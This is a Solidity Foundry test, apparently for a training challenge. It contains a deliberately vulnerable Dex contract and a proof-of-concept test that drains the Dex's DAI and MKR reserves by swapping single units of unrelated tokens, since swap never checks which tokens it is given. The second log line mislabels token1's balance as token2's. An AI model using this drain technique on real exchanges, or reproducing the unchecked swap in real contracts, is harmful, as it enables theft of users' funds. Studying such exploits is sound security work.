// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "forge-std/Test.sol";

contract DexTest is Test {
    SwappableToken token1;
    SwappableToken token2;
    SwappableToken token3;
    SwappableToken token4;

    Dex dex;
    address anyone = address(100);
    function setUp() public {
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "DAI", "DAI", 1e24);
        token2 = new SwappableToken(address(dex), "MKR", "MKR", 1e24);
        token3 = new SwappableToken(address(dex), "WETH", "WETH", 1e24);
        token4 = new SwappableToken(address(dex), "USDC", "USDC", 1e24);

        dex.setTokens(address(token1), address(token2));
        token1.transfer(address(dex), 100e18);
        token2.transfer(address(dex), 100e18);
        token3.transfer(address(dex), 1);
        token4.transfer(address(dex), 1);
        token1.transfer(anyone, 10e18);
        token2.transfer(anyone, 10e18);
        token3.transfer(anyone, 1);
        token4.transfer(anyone, 1);
    }

    function testDex2DrainReserves() public {
        vm.startPrank(anyone);
        token3.approve(address(dex), 1);
        token4.approve(address(dex), 1);

        dex.swap(address(token3), address(token1), 1);
        dex.swap(address(token4), address(token2), 1);

        vm.stopPrank();

        console.log(
            "Balance token1: ",
            dex.balanceOf(address(token1), address(dex))
        );
        console.log(
            "Balance token2: ",
            dex.balanceOf(address(token1), address(dex))
        );
    }
}

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() Ownable(msg.sender) {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(
        address token_address,
        uint256 amount
    ) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }

    function transfer(
        address to,
        uint256 amount
    ) public override returns (bool) {
        console.log("Transfer sender: ", msg.sender);
        return super.transfer(to, amount);
    }
}
